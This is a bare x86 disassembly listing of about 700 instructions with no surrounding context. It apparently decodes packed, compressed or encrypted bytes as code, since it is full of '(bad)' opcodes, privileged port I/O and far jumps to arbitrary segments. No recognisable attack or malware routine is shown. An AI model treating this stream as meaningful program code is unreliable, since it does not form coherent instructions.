  406b1b:	je     0x406b07
  406b1d:	or     al,0xc6
  406b1f:	adc    al,0x31
  406b21:	mov    cs,WORD PTR [ebx-0x6fd28e53]
  406b27:	add    DWORD PTR [edi-0xe72398a],ecx
  406b2d:	cmp    ch,BYTE PTR [edi-0x60539682]
  406b33:	sbb    BYTE PTR [edi],ah
  406b35:	sub    BYTE PTR [esi],ah
  406b37:	test   BYTE PTR [ecx-0x2b],al
  406b3a:	jl     0x406abe
  406b3c:	pop    ds
  406b3d:	stos   BYTE PTR es:[edi],al
  406b3e:	inc    edi
  406b3f:	adc    DWORD PTR [ebx],0xe0b400b
  406b45:	sbb    edx,eax
  406b47:	lock loope 0x406acb
  406b4a:	mov    al,ch
  406b4c:	imul   edx,edx,0x6
  406b4f:	js     0x406b62
  406b51:	sbb    bh,BYTE PTR [eax+0x5238bcb]
  406b57:	inc    ebp
  406b58:	pop    es
  406b59:	mov    eax,ds:0x70c0f6c
  406b5e:	fisttp WORD PTR [eax]
  406b60:	dec    eax
  406b61:	dec    esi
  406b62:	add    BYTE PTR [ebx-0x1c8b24b],bl
  406b68:	pop    esp
  406b69:	in     eax,dx
  406b6a:	fcom   st(4)
  406b6c:	adc    BYTE PTR [eax+edx*2],bl
  406b6f:	ja     0x406b73
  406b71:	lock xchg ebp,eax
  406b73:	xor    al,al
  406b75:	scas   al,BYTE PTR es:[edi]
  406b76:	pushf  
  406b77:	xchg   edi,eax
  406b78:	icebp  
  406b79:	(bad)  
  406b7a:	es pop ecx
  406b7c:	xchg   ecx,eax
  406b7d:	xchg   DWORD PTR [ebp+0x33818a4f],edi
  406b83:	adc    dh,0xd7
  406b86:	sbb    DWORD PTR [esp+eax*8-0x6d],0x5e5b67b9
  406b8e:	js     0x406b65
  406b90:	adc    BYTE PTR [ecx-0x5cff50f1],ah
  406b96:	aaa    
  406b97:	stos   DWORD PTR es:[edi],eax
  406b98:	push   cs
  406b99:	sahf   
  406b9a:	push   edx
  406b9b:	add    DWORD PTR [ebp-0x1518c2c1],esi
  406ba1:	xchg   ebp,eax
  406ba2:	add    ah,BYTE PTR [esi+0x4c7d2172]
  406ba8:	out    0x25,al
  406baa:	repz xchg esi,eax
  406bac:	sar    DWORD PTR [ecx+0x61],1
  406baf:	sbb    edx,ebp
  406bb1:	or     bl,bl
  406bb3:	cmp    eax,0x29cb4905
  406bb8:	jb     0x406bf9
  406bba:	mov    edx,0x971b5a75
  406bbf:	ja     0x406c30
  406bc1:	call   0x8f17:0x308edfce
  406bc8:	jmp    0x406baf
  406bca:	(bad)  
  406bcb:	pop    edi
  406bcc:	and    al,0x97
  406bce:	test   DWORD PTR [ebx],0x75ca66b7
  406bd4:	icebp  
  406bd5:	xchg   esi,eax
  406bd6:	mov    ah,0xa2
  406bd8:	sub    DWORD PTR [edi+0x4c],0x915423e
  406bdf:	je     0x406ba6
  406be1:	int3   
  406be2:	dec    esi
  406be3:	outs   dx,DWORD PTR ds:[esi]
  406be4:	sub    eax,0xf387543e
  406be9:	dec    ebx
  406bea:	aas    
  406beb:	out    0xfd,al
  406bed:	dec    edx
  406bee:	arpl   WORD PTR [edx+0x575b2c38],bp
  406bf4:	jp     0x406b79
  406bf6:	and    cl,0xe
  406bf9:	(bad)  
  406bfa:	dec    eax
  406bfc:	or     dh,bl
  406bfe:	dec    esi
  406bff:	xor    DWORD PTR [ebp+0x4eb38a69],eax
  406c05:	in     al,0x4e
  406c07:	dec    esp
  406c08:	sahf   
  406c09:	cld    
  406c0a:	or     DWORD PTR [ebx],ebx
  406c0c:	call   0xc6ec:0x4e23a87c
  406c13:	dec    esp
  406c14:	or     cl,BYTE PTR [esi]
  406c16:	mov    esi,eax
  406c18:	aaa    
  406c19:	sub    eax,0xd6e5bd5e
  406c1e:	xchg   ebp,eax
  406c1f:	jb     0x406bbf
  406c21:	aas    
  406c22:	in     eax,dx
  406c23:	jp     0x406be9
  406c25:	mov    cl,0x6
  406c27:	jg     0x406c4f
  406c29:	mov    bh,0xfc
  406c2b:	xchg   esi,eax
  406c2c:	inc    eax
  406c2d:	pop    ecx
  406c2e:	jbe    0x406caa
  406c30:	jns    0x406c4d
  406c32:	shl    BYTE PTR [ecx+esi*4],0xec
  406c36:	xchg   edi,eax
  406c37:	adc    eax,0xd97a07a
  406c3c:	scas   eax,DWORD PTR es:[edi]
  406c3d:	inc    ecx
  406c3e:	bound  esp,QWORD PTR [esi+0x37]
  406c41:	push   esi
  406c42:	cmp    BYTE PTR [ebx+0xaf69a8f],ch
  406c48:	jge    0x406bce
  406c4a:	std    
  406c4b:	test   BYTE PTR [edi+0x67b5ae12],0xce
  406c52:	sar    BYTE PTR [edx+0x4ca7b340],cl
  406c58:	cwde   
  406c59:	das    
  406c5a:	ror    edi,0xac
  406c5d:	and    ah,BYTE PTR [edi-0x323ed980]
  406c63:	add    ebp,DWORD PTR [ebp-0x564ed308]
  406c69:	nop
  406c6a:	jnp    0x406bfc
  406c6c:	push   es
  406c6d:	adc    dh,dh
  406c6f:	pop    ebp
  406c70:	push   esi
  406c71:	cvtps2pi mm2,xmm1
  406c74:	push   ss
  406c75:	mov    ebp,0xfe725391
  406c7a:	fidivr WORD PTR cs:[edx-0x11]
  406c7e:	clc    
  406c7f:	jmp    0x1ee3:0x67292bc0
  406c86:	aad    0x63
  406c88:	push   edi
  406c89:	dec    ebp
  406c8a:	popf   
  406c8b:	gs ret 
  406c8d:	in     eax,0xe6
  406c8f:	xor    ecx,esi
  406c91:	xchg   ebp,eax
  406c92:	out    dx,al
  406c93:	fimul  WORD PTR [edi+eiz*4]
  406c96:	scas   eax,DWORD PTR es:[edi]
  406c97:	pop    ebx
  406c98:	mov    ds,WORD PTR [eax+edi*1]
  406c9b:	outs   dx,DWORD PTR ds:[esi]
  406c9c:	inc    esi
  406c9d:	ja     0x406cd4
  406c9f:	out    0xb2,al
  406ca1:	jne    0x406c9c
  406ca3:	leave  
  406ca4:	xor    DWORD PTR [edx-0x55],eax
  406ca7:	iret   
  406ca8:	sti    
  406ca9:	ins    DWORD PTR es:[edi],dx
  406caa:	and    al,0x25
  406cac:	ror    DWORD PTR [ebp+0x6f],1
  406caf:	ror    BYTE PTR [edi+0xcfa4910],0x6a
  406cb6:	jmp    0x296b:0x281f6601
  406cbd:	pop    ds
  406cbe:	daa    
  406cbf:	inc    edi
  406cc0:	cmp    BYTE PTR [ebx+0x32],bl
  406cc3:	addr16 jg 0x406c48
  406cc6:	js     0x406d47
  406cc8:	mov    WORD PTR [edx],cs
  406cca:	pop    edi
  406ccb:	dec    esi
  406ccc:	(bad)  
  406ccd:	jmp    0x6e7e:0x9a3dc7c2
  406cd4:	cmp    BYTE PTR [edx+0x4192d456],0x37
  406cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cdc:	les    ecx,FWORD PTR [esi+0x6bf54659]
  406ce2:	paddsw mm2,QWORD PTR [edx-0x3f23e148]
  406ce9:	dec    esi
  406cea:	add    esi,DWORD PTR [edx+0x50]
  406ced:	xor    bl,BYTE PTR [edx+esi*2]
  406cf0:	pop    ebx
  406cf1:	and    BYTE PTR ds:0x9ab50375,ch
  406cf7:	lods   al,BYTE PTR ds:[esi]
  406cf8:	push   es
  406cf9:	js     0x406d5d
  406cfb:	mov    gs,WORD PTR [esi]
  406cfd:	dec    eax
  406cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cff:	or     DWORD PTR [eax],eax
  406d01:	(bad)  
  406d02:	xor    eax,0xc87f2da0
  406d07:	pop    eax
  406d08:	push   ds
  406d09:	mov    ebp,0x2ec76492
  406d0e:	mov    eax,ds:0x443ab912
  406d13:	inc    edi
  406d14:	fdivp  st(5),st
  406d16:	mov    ecx,ebx
  406d18:	out    0xc9,eax
  406d1a:	and    ebx,DWORD PTR [esi+0x45]
  406d1d:	scas   al,BYTE PTR es:[edi]
  406d1e:	fwait
  406d1f:	jns    0x406d9c
  406d21:	int    0x4b
  406d23:	lahf   
  406d24:	push   ds
  406d25:	mov    DWORD PTR [edx-0x31613ae8],edi
  406d2b:	xlat   BYTE PTR ds:[ebx]
  406d2c:	add    BYTE PTR [ebx],dl
  406d2e:	stos   BYTE PTR es:[edi],al
  406d2f:	sti    
  406d30:	pop    edx
  406d31:	addr16 push eax
  406d33:	aaa    
  406d34:	pop    esi
  406d35:	dec    esi
  406d36:	cmp    DWORD PTR [esi-0x528a86f1],eax
  406d3c:	(bad)  
  406d3e:	push   esp
  406d3f:	push   esp
  406d40:	mov    bh,0x6f
  406d42:	inc    esp
  406d43:	inc    edx
  406d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d45:	add    al,0x80
  406d47:	mov    ?,WORD PTR [eax]
  406d49:	imul   edx,DWORD PTR ds:0xe4d7b816,0x1eecbf37
  406d53:	mov    ebp,0x19c7eec5
  406d58:	mov    bh,0x4d
  406d5a:	mov    al,0xc5
  406d5c:	repz hlt 
  406d5e:	in     eax,dx
  406d5f:	jnp    0x406d9c
  406d61:	xchg   edx,eax
  406d62:	sub    BYTE PTR [esi+0x22],0x25
  406d66:	push   ebp
  406d67:	add    BYTE PTR [esp+ecx*1+0x4a523e5b],al
  406d6e:	sub    ebx,DWORD PTR [ebx+0x6f]
  406d71:	fnsave [esi-0x6f]
  406d74:	bt     ebx,eax
  406d77:	int3   
  406d78:	clc    
  406d79:	enter  0x21fb,0x59
  406d7d:	mov    BYTE PTR [ebp+eiz*2+0x27dfa337],bh
  406d84:	xchg   ebx,eax
  406d85:	sar    BYTE PTR [eax+0x534edec],0x74
  406d8c:	pop    ecx
  406d8d:	addr16 jp 0x406d8a
  406d90:	xchg   BYTE PTR [esi+0x57],cl
  406d93:	xchg   esi,eax
  406d94:	call   0xd75a:0x1bbea2f
  406d9b:	mov    cl,0x10
  406d9d:	jmp    0x406d77
  406d9f:	imul   edx,DWORD PTR [ebp+0x5f],0x5b
  406da3:	or     dl,BYTE PTR [edi+eax*4+0x3c8678a4]
  406daa:	and    edi,ebx
  406dac:	(bad)  
  406dad:	add    bh,BYTE PTR ds:[esi]
  406db0:	in     eax,dx
  406db1:	aas    
  406db2:	push   esi
  406db3:	and    edi,ecx
  406db5:	xor    cl,bl
  406db7:	(bad)  
  406db8:	scas   eax,DWORD PTR es:[edi]
  406db9:	and    ch,bh
  406dbb:	ss js  0x406d66
  406dbe:	pushf  
  406dbf:	stos   BYTE PTR es:[edi],al
  406dc0:	nop
  406dc1:	xchg   ecx,eax
  406dc2:	adc    esp,DWORD PTR [ecx-0x1a5f37ef]
  406dc8:	mov    es:0x77face94,eax
  406dce:	imul   eax,DWORD PTR [ebp+0x1d],0x50
  406dd2:	xor    al,0xb8
  406dd4:	dec    ebp
  406dd5:	push   esi
  406dd6:	inc    ecx
  406dd7:	loop   0x406e24
  406dd9:	mov    bl,0x41
  406ddb:	(bad)  
  406ddc:	sbb    ebp,DWORD PTR [eax+0x30]
  406ddf:	inc    eax
  406de0:	jb     0x406e1f
  406de2:	jle    0x406dda
  406de4:	pop    esi
  406de5:	adc    eax,DWORD PTR [ecx]
  406de7:	ret    0x1070
  406dea:	xchg   edx,eax
  406deb:	das    
  406dec:	dec    ebx
  406ded:	add    eax,0xca127934
  406df2:	pop    eax
  406df3:	and    BYTE PTR [ebx+0x2b],dh
  406df6:	push   ds
  406df7:	xchg   ebp,eax
  406df8:	jno    0x406e75
  406dfa:	sub    al,0x6a
  406dfc:	jp     0x406e19
  406dfe:	xchg   esp,eax
  406dff:	or     BYTE PTR ss:[ebx-0x6f],bh
  406e03:	mov    ecx,0x324487c3
  406e08:	xchg   BYTE PTR [edx],dh
  406e0a:	sbb    eax,0xc5453701
  406e0f:	and    ah,BYTE PTR [eax-0x5a]
  406e12:	mov    bh,BYTE PTR [esi]
  406e14:	sub    BYTE PTR [ecx+esi*1+0x4882483c],bl
  406e1b:	das    
  406e1c:	or     esp,ecx
  406e1e:	(bad)  [eax]
  406e20:	jno    0x406df0
  406e22:	fs jns 0x406ddf
  406e25:	repnz push cs
  406e27:	call   0xb204:0xe7223e71
  406e2e:	dec    edi
  406e2f:	loope  0x406ea9
  406e31:	fs icebp 
  406e33:	mov    ecx,0xf83fb0c2
  406e38:	(bad)  
  406e39:	fisub  DWORD PTR [esi-0x26]
  406e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e3d:	retf   0x4cbf
  406e40:	xchg   esi,eax
  406e41:	xor    BYTE PTR [eax+0x5bf8a9de],ah
  406e47:	mov    bh,0x0
  406e49:	ret    0x87fa
  406e4c:	xchg   cl,al
  406e4e:	sbb    dh,BYTE PTR [ecx-0x4be8fb17]
  406e54:	loopne 0x406e17
  406e56:	lds    ebx,FWORD PTR [ebp-0x1f]
  406e59:	outs   dx,BYTE PTR ds:[esi]
  406e5a:	pusha  
  406e5b:	ja     0x406eaf
  406e5d:	call   DWORD PTR [ebp+0x20941442]
  406e63:	dec    ebx
  406e64:	int3   
  406e65:	loope  0x406e2c
  406e67:	mov    ecx,0xf96cda86
  406e6c:	jle    0x406e33
  406e6e:	xchg   edi,eax
  406e6f:	sar    DWORD PTR [ebx],cl
  406e71:	or     al,0x2b
  406e73:	sti    
  406e74:	adc    DWORD PTR [esi+0x527f062c],ecx
  406e7a:	xor    DWORD PTR [ebx],eax
  406e7c:	daa    
  406e7d:	sbb    ah,al
  406e7f:	loop   0x406e48
  406e81:	mov    ecx,0xc9106ca6
  406e86:	or     edx,DWORD PTR [edx-0x4e]
  406e89:	sahf   
  406e8a:	cmc    
  406e8b:	jmp    0xf623d534
  406e90:	push   0x146bc8c2
  406e95:	mov    edi,0x6119cccc
  406e9a:	jnp    0x406ee6
  406e9c:	mov    ds:0xfc0cbb48,eax
  406ea1:	pop    ebx
  406ea2:	dec    ecx
  406ea3:	ja     0x406e30
  406ea5:	xchg   DWORD PTR fs:[ebx-0x468d2264],esp
  406eac:	mov    edi,0x833b2eef
  406eb1:	push   ebp
  406eb2:	imul   ecx,DWORD PTR [ecx],0x177e8ae1
  406eb8:	or     bh,BYTE PTR [ebx+ecx*2-0x35]
  406ebc:	adc    ebp,DWORD PTR [edx]
  406ebe:	xor    dh,cl
  406ec0:	inc    edi
  406ec1:	add    eax,0x6b0988b1
  406ec6:	pop    eax
  406ec7:	ror    cl,1
  406ec9:	mov    bl,0x7b
  406ecb:	cmp    ecx,DWORD PTR [ecx-0x48]
  406ece:	and    DWORD PTR [edi-0x35],esp
  406ed1:	push   ebx
  406ed2:	pop    esp
  406ed3:	jp     0x406f32
  406ed5:	cmp    ebp,DWORD PTR [esi]
  406ed7:	rcr    BYTE PTR [edi],cl
  406ed9:	mov    ebx,0x199eef80
  406ede:	int    0x2f
  406ee0:	jp     0x406e77
  406ee2:	sub    eax,0xe819ed20
  406ee7:	pushf  
  406ee8:	cld    
  406ee9:	sub    BYTE PTR [esi],0x3b
  406eec:	cwde   
  406eed:	add    DWORD PTR [esi+0x1c],0x2b
  406ef1:	jmp    0xf6f892c7
  406ef6:	scas   al,BYTE PTR es:[edi]
  406ef7:	call   0x539c0fc3
  406efc:	retf   0x7f6a
  406eff:	fwait
  406f00:	aam    0x87
  406f02:	mov    cl,0xe5
  406f04:	stos   DWORD PTR es:[edi],eax
  406f05:	adc    ah,dl
  406f07:	mov    edi,0xdf44ef7e
  406f0c:	imul   eax,edx,0x62
  406f0f:	jno    0x406f77
  406f11:	sti    
  406f12:	dec    edi
  406f13:	pop    edi
  406f14:	and    dh,BYTE PTR [ecx]
  406f16:	test   eax,0x22275730
  406f1b:	push   ebp
  406f1c:	sub    dl,BYTE PTR [esi+0x29]
  406f1f:	fist   WORD PTR [ecx]
  406f21:	or     al,0x14
  406f23:	and    eax,0x9621c0b2
  406f28:	(bad)  
  406f29:	mov    ecx,0xb3d88ede
  406f2e:	das    
  406f2f:	mov    ebp,0x3a4a1d45
  406f34:	or     esi,DWORD PTR [edx+0x2e7a2e28]
  406f3a:	or     edi,DWORD PTR [edx+edx*1]
  406f3d:	mov    eax,0xa5989d66
  406f42:	adc    eax,DWORD PTR [ebp-0x5a]
  406f45:	loope  0x406fa2
  406f47:	fs ins DWORD PTR es:[edi],dx
  406f49:	xor    eax,0x9fff0a59
  406f4e:	adc    dh,bl
  406f50:	jns    0x406f6a
  406f52:	nop
  406f53:	shr    BYTE PTR [edi-0x48],0x1b
  406f57:	mov    BYTE PTR [edi+esi*8],dl
  406f5a:	jmp    0x406fac
  406f5c:	out    dx,al
  406f5d:	iret   
  406f5e:	add    BYTE PTR [esi+0x7a],0x3c
  406f62:	dec    eax
  406f63:	mov    esp,0x3ddf3cfe
  406f68:	lods   al,BYTE PTR ds:[esi]
  406f69:	push   ds
  406f6a:	in     eax,0xc6
  406f6c:	iret   
  406f6d:	jnp    0x406fe8
  406f6f:	cmp    edx,edx
  406f71:	fdivr  DWORD PTR [esi]
  406f73:	enter  0xe3fc,0x1f
  406f77:	sahf   
  406f78:	jp     0x406fc6
  406f7a:	test   al,0x40
  406f7c:	or     eax,0xecd66cc7
  406f81:	es int3 
  406f83:	ss loope 0x406f53
  406f86:	ret    
  406f87:	adc    DWORD PTR [edx+0xa],ecx
  406f8a:	adc    BYTE PTR [ebp-0x10f2ae06],0x21
  406f91:	jl     0x406fe0
  406f93:	test   eax,0x42fdbb92
  406f98:	(bad)  
  406f99:	push   ebp
  406f9a:	mov    cl,0x65
  406f9c:	shl    ebx,cl
  406f9e:	popf   
  406f9f:	lock jecxz 0x406fd4
  406fa2:	mov    edi,edx
  406fa4:	jb     0x406f38
  406fa6:	lahf   
  406fa7:	mov    cl,0x50
  406fa9:	xor    al,0xa2
  406fab:	ds xchg ebx,eax
  406fad:	dec    BYTE PTR [edx]
  406faf:	and    DWORD PTR [ebx+0x6bcc49ca],esp
  406fb5:	out    0x11,eax
  406fb7:	loop   0x406f74
  406fb9:	xor    eax,0x12502979
  406fbe:	dec    esp
  406fbf:	and    eax,DWORD PTR [ecx]
  406fc1:	test   al,0x9c
  406fc3:	test   al,0x1a
  406fc5:	mov    eax,0x97ba6afd
  406fca:	mov    dh,0xbb
  406fcc:	les    ebp,FWORD PTR [eax+0x10608ab9]
  406fd2:	push   esi
  406fd3:	(bad)  
  406fd5:	(bad)  
  406fd6:	xor    al,0x81
  406fd8:	push   eax
  406fd9:	mov    esi,0xaaa93744
  406fde:	mov    eax,0x5e28ca15
  406fe3:	inc    edx
  406fe4:	xor    al,0xd6
  406fe6:	sbb    eax,0x9a466018
  406feb:	push   esi
  406fec:	sbb    eax,0x8b4b474d
  406ff1:	add    BYTE PTR [esi-0x2cb5eca4],cl
  406ff7:	stos   DWORD PTR es:[edi],eax
  406ff8:	push   edi
  406ff9:	mov    BYTE PTR [edx+0x3f2451b5],cl
  406fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407000:	ret    
  407001:	add    ebx,DWORD PTR [edi]
  407003:	jbe    0x407056
  407005:	(bad)  
  407006:	aad    0x47
  407008:	hlt    
  407009:	and    al,0xa0
  40700b:	mov    ah,0x2a
  40700d:	fmul   st,st(5)
  40700f:	mov    bh,0x9a
  407011:	xor    eax,0xe871b57b
  407016:	stos   BYTE PTR es:[edi],al
  407017:	mov    al,ds:0x31bcf26c
  40701c:	outs   dx,BYTE PTR ds:[esi]
  40701d:	das    
  40701e:	mov    edx,DWORD PTR [ecx+0x40]
  407021:	shl    BYTE PTR [ebp-0x6b],cl
  407024:	jno    0x40705c
  407026:	and    al,0xf9
  407028:	jmp    0xb8a6:0xe3bc85ca
  40702f:	in     eax,0x14
  407031:	sahf   
  407032:	mov    eax,ds:0x6f7fbf98
  407037:	std    
  407038:	fcomp  QWORD PTR [ebx]
  40703a:	cwde   
  40703b:	mov    ebp,ebp
  40703d:	mov    bh,0x46
  40703f:	mov    edx,0x7229d6b8
  407044:	sbb    dh,BYTE PTR [eax+eiz*2-0x62fc12fb]
  40704b:	das    
  40704c:	je     0x407016
  40704e:	ret    
  40704f:	push   edx
  407050:	pop    ecx
  407051:	cs sbb eax,0x8b3ea1b7
  407057:	outs   dx,DWORD PTR ds:[esi]
  407058:	inc    esi
  407059:	xchg   BYTE PTR [ebx+0x6eaf252e],ah
  40705f:	xchg   edi,eax
  407060:	in     eax,dx
  407061:	call   FWORD PTR [ecx+0x2e11f6b1]
  407067:	popf   
  407068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407069:	or     DWORD PTR gs:[ebx+0x5b902e5a],ebx
  407070:	das    
  407071:	sub    ch,BYTE PTR [edi-0x40fa855]
  407077:	or     eax,0x4486f3c
  40707c:	shl    BYTE PTR [eax],0x1f
  40707f:	xchg   esi,eax
  407080:	je     0x40707c
  407082:	fwait
  407083:	imul   esi,DWORD PTR [eax+ebx*4-0x7062bd2f],0x6e
  40708b:	les    edi,FWORD PTR [edi]
  40708d:	std    
  40708e:	or     eax,0x1a01e674
  407093:	jno    0x4070be
  407095:	loopne 0x407050
  407097:	je     0x4070da
  407099:	ret    
  40709a:	push   ecx
  40709b:	pop    edx
  40709c:	add    eax,0x4032b9fd
  4070a1:	sbb    ecx,DWORD PTR [eax]
  4070a3:	sub    eax,0x3f06e459
  4070a8:	mov    eax,ds:0xb6f74305
  4070ad:	xchg   ecx,eax
  4070ae:	data16 stos BYTE PTR es:[edi],al
  4070b0:	dec    ebx
  4070b2:	popf   
  4070b3:	or     dl,BYTE PTR [ecx-0x7c]
  4070b6:	jmp    0x67aa:0xbe5471d9
  4070bd:	dec    esi
  4070be:	add    cl,BYTE PTR [edi+0x4d]
  4070c1:	xor    BYTE PTR [ecx-0x48],0x54
  4070c5:	inc    edx
  4070c6:	mov    ebx,0xc61ef0e9
  4070cb:	test   al,0xdf
  4070cd:	jg     0x407108
  4070cf:	pop    es
  4070d0:	lods   al,BYTE PTR ds:[esi]
  4070d1:	test   eax,0x27ccb8e6
  4070d6:	xor    al,0xd
  4070d8:	jo     0x40713d
  4070da:	retf   
  4070db:	mov    edx,DWORD PTR [eax]
  4070dd:	fmul   DWORD PTR [edi+0x2d]
  4070e0:	jl     0x4070b9
  4070e2:	mov    esi,0x332120e1
  4070e7:	mov    esi,0x6a031f9e
  4070ed:	inc    ebp
  4070ee:	add    al,BYTE PTR cs:[esi+0x66]
  4070f2:	push   edi
  4070f3:	cld    
  4070f4:	pop    edi
  4070f5:	mov    ds:0x5d645614,al
  4070fa:	pop    es
  4070fb:	(bad)  [esi]
  4070fd:	les    edi,FWORD PTR [ecx-0x15]
  407100:	addr16 sbb eax,0xc3ed38af
  407106:	jno    0x4070b2
  407108:	xchg   esi,eax
  407109:	aaa    
  40710a:	sahf   
  40710b:	inc    ecx
  40710c:	mov    esi,0x289dbba0
  407111:	add    al,0xeb
  407113:	out    dx,al
  407114:	push   eax
  407115:	pushf  
  407116:	ss dec ebp
  407118:	pop    es
  407119:	cli    
  40711a:	das    
  40711b:	(bad)  
  40711d:	dec    edx
  40711e:	adc    DWORD PTR [esi+0x26e223c8],ebp
  407124:	ja     0x4070b2
  407126:	xchg   edi,eax
  407127:	and    eax,0xd81338f8
  40712c:	retf   
  40712d:	outs   dx,BYTE PTR ds:[esi]
  40712e:	stos   BYTE PTR es:[edi],al
  40712f:	bnd je 0x407108
  407132:	xchg   ebp,eax
  407133:	sar    BYTE PTR ds:0x787ac466,1
  407139:	sbb    eax,0x2801b20e
  40713e:	inc    esp
  40713f:	sub    dh,BYTE PTR [edi-0x574483b4]
  407145:	inc    edi
  407146:	pop    esi
  407147:	retf   0x1cd3
  40714a:	aaa    
  40714b:	div    esi
  40714d:	and    al,0xa
  40714f:	ret    
  407150:	pop    ebp
  407151:	mov    ?,WORD PTR [eax]
  407153:	ror    bh,1
  407155:	mov    cl,0x22
  407157:	mov    ebx,0x53ae1ac4
  40715c:	sub    BYTE PTR [ebx],dh
  40715e:	cmp    dl,0x35
  407161:	sub    al,0xca
  407163:	inc    edx
  407164:	push   0xd7faa9ef
  407169:	xor    BYTE PTR ds:0x254541f9,cl
  40716f:	mov    ds:0xf3f7b879,eax
  407174:	sub    eax,0xf26f3fbd
  407179:	es inc ebp
  40717b:	pop    ds
  40717c:	test   DWORD PTR [ebx-0x4d],esp
  40717f:	out    0xfd,eax
  407181:	xor    DWORD PTR [eax+0x43],esp
  407184:	pop    esi
  407185:	out    0xa1,eax
  407187:	cmp    BYTE PTR [eax],ah
  407189:	into   
  40718a:	pop    ebp
  40718b:	xor    eax,0x825e9ca0
  407190:	mov    ds:0xbfcbbe3b,al
  407195:	repnz inc esi
  407197:	fild   DWORD PTR [edx+0x6]
  40719a:	sub    al,0x4
  40719c:	mov    dl,0xb6
  40719e:	retf   
  40719f:	fs ret 0xb620
  4071a3:	add    al,0xe0
  4071a5:	push   0x907e1e1a
  4071aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071ac:	push   edi
  4071ad:	call   0xf97779c
  4071b2:	xchg   BYTE PTR [ecx+0x470407cf],ah
  4071b8:	mov    ?,eax
  4071ba:	daa    
  4071bb:	lahf   
  4071bc:	jb     0x407175
  4071be:	inc    bh
  4071c0:	es (bad) 
  4071c2:	adc    eax,0x1e07a28
  4071c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c8:	imul   ebp,eax,0xffffff92
  4071cb:	jmp    0x407212
  4071cd:	dec    ecx
  4071ce:	inc    esi
  4071cf:	fcom   st(2)
  4071d1:	retf   0xe8c
  4071d4:	jmp    FWORD PTR [ecx-0x1b175e01]
  4071da:	adc    al,cl
  4071dc:	shl    ecx,0xa4
  4071df:	mov    ebp,0x3089f3b4
  4071e4:	daa    
  4071e5:	mov    ebx,0xf4b31759
  4071ea:	es cmp eax,0xc8bb34f2
  4071f0:	dec    ebp
  4071f1:	jbe    0x407209
  4071f3:	outs   dx,BYTE PTR ds:[esi]
  4071f4:	mov    ebx,0x9448f532
  4071f9:	stc    
  4071fa:	mov    ecx,0x1ff3c0dc
  4071ff:	fistp  WORD PTR [ebp-0x28898556]
  407205:	sbb    eax,0x3dee5c6d
  40720a:	cli    
  40720b:	arpl   dx,bx
  40720d:	call   0x9e07549e
  407212:	popf   
  407213:	jmp    0x407216
  407215:	cli    
  407216:	js     0x4071c3
  407218:	dec    esi
  407219:	add    eax,0xec26a651
  40721e:	not    ecx
  407220:	mul    DWORD PTR [edi]
  407222:	std    
  407223:	test   BYTE PTR [ecx-0x240c9a4b],bh
  407229:	stc    
  40722a:	sbb    eax,0xf25af17c
  40722f:	fwait
  407230:	push   ebx
  407231:	xchg   BYTE PTR [esi-0x35],al
  407234:	or     bh,ch
  407236:	out    dx,al
  407237:	dec    ebx
  407238:	ins    BYTE PTR es:[edi],dx
  407239:	int    0x66
  40723b:	into   
  40723c:	cmp    DWORD PTR [ecx-0x29],edi
  40723f:	imul   ebp,DWORD PTR [ecx+0xa],0x57
  407243:	dec    esp
  407244:	int    0xde
  407246:	or     eax,0x3aef5c25
  40724b:	inc    ecx
  40724c:	test   eax,0x84752352
  407251:	xchg   cl,ah
  407253:	mov    ds:0x82b0796a,eax
  407258:	repz inc eax
  40725a:	out    dx,eax
  40725b:	lods   al,BYTE PTR ds:[esi]
  40725c:	xor    DWORD PTR ds:[ebp+0x55],ecx
  407260:	bound  ebp,QWORD PTR es:[eax-0xa]
  407264:	mov    ecx,0xd52f6ebb
  407269:	or     BYTE PTR [esi+0x74161a50],bh
  40726f:	mov    bl,0x2a
  407271:	mov    WORD PTR [eax+0x50d71be3],?
  407277:	out    dx,al
  407278:	inc    edx
  407279:	(bad)
  40727d:	vmread DWORD PTR [ebx-0x498b295c],edx
  407284:	mov    bl,0xae
  407286:	cmp    bl,BYTE PTR [ebx+0x20]
  407289:	add    BYTE PTR [edx],0xcc
  40728c:	ins    BYTE PTR es:[edi],dx
  40728d:	jb     0x407229
  40728f:	clc    
  407290:	pop    es
  407291:	pop    edi
  407292:	add    edx,edi
  407294:	push   esp
  407295:	aam    0x8a
  407297:	lds    eax,FWORD PTR [ebp-0x5]
  40729a:	sub    bh,BYTE PTR ds:0xc49b9f78
  4072a0:	test   DWORD PTR ds:0x8908c4e6,0x6fee59a4
  4072aa:	mov    dl,0x2a
  4072ac:	stc    
  4072ad:	pop    es
  4072ae:	cmc    
  4072af:	(bad)  
  4072b1:	test   eax,0x8129eb77
  4072b6:	adc    ebp,DWORD PTR [ebx]
  4072b8:	iret   
  4072b9:	ss sub al,0xc
  4072bc:	xlat   BYTE PTR ds:[ebx]
  4072bd:	(bad)  
  4072be:	nop
  4072bf:	mov    bh,0x83
  4072c1:	outs   dx,BYTE PTR ds:[esi]
  4072c2:	mov    eax,0x232dbadf
  4072c7:	(bad)  
  4072c8:	lods   al,BYTE PTR ds:[esi]
  4072c9:	enter  0x713c,0x94
  4072cd:	in     eax,dx
  4072ce:	rcl    DWORD PTR [ebp-0x7c],cl
  4072d1:	pop    ss
  4072d2:	mul    BYTE PTR [eax]
  4072d4:	jmp    0x40730a
  4072d6:	(bad)  
  4072d7:	clc    
  4072d8:	sbb    bh,BYTE PTR [ebx+0x75]
  4072db:	bound  edi,QWORD PTR [esi-0x3ec4650d]
  4072e1:	adc    bl,BYTE PTR [edi-0x7c]
  4072e4:	bound  ecx,QWORD PTR [ebp-0x5a]
  4072e7:	xchg   DWORD PTR [ecx+0x2e],ebp
  4072ea:	jle    0x40734c
  4072ec:	sbb    BYTE PTR [ebx],cl
  4072ee:	mov    dh,0xc8
  4072f0:	fisubr DWORD PTR [edi]
  4072f2:	stos   DWORD PTR es:[edi],eax
  4072f3:	adc    al,bl
  4072f5:	sbb    eax,0x1de852e9
  4072fa:	ror    BYTE PTR [edi],0xcd
  4072fd:	dec    ebp
  4072fe:	in     al,dx
  4072ff:	adc    al,0x1d
